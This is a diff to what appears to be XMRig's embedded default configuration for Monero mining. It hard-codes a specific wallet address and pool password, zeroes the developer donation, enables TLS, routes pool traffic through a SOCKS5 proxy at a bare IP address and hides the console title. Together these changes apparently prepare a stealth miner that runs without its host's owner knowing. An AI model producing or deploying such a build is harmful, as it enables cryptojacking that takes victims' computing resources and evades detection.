@@ -40,10 +40,10 @@ R"===(
         "access-token": null,
         "restricted": true
     },
-    "autosave": true,
+    "autosave": false,
     "background": false,
     "colors": true,
-    "title": true,
+    "title": false,
     "randomx": {
         "init": -1,
         "init-avx2": -1,
@@ -85,24 +85,24 @@ R"===(
         "cn/0": false,
         "cn-lite/0": false
     },
-    "donate-level": 1,
-    "donate-over-proxy": 1,
+    "donate-level": 0,
+    "donate-over-proxy": 0,
     "log-file": null,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
-            "pass": "x",
+            "url": "pool.supportxmr.com:443",
+            "user": "42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU",
+            "pass": "XMR_791_E2B",
             "rig-id": null,
             "nicehash": false,
-            "keepalive": false,
+            "keepalive": true,
             "enabled": true,
-            "tls": false,
+            "tls": true,
             "tls-fingerprint": null,
             "daemon": false,
-            "socks5": null,
+            "socks5": "98.175.31.195:4145",
             "self-select": null,
             "submit-to-origin": false
         }
@@ -114,7 +114,7 @@ R"===(
     "retry-pause": 5,
     "syslog": false,
     "tls": {
-        "enabled": false,
+        "enabled": true,
         "protocols": null,
         "cert": null,
         "cert_key": null,
@@ -124,7 +124,7 @@ R"===(
     },
     "user-agent": null,
     "verbose": 0,
-    "watch": true,
+    "watch": false,
     "pause-on-battery": false,
     "pause-on-active": false
 }
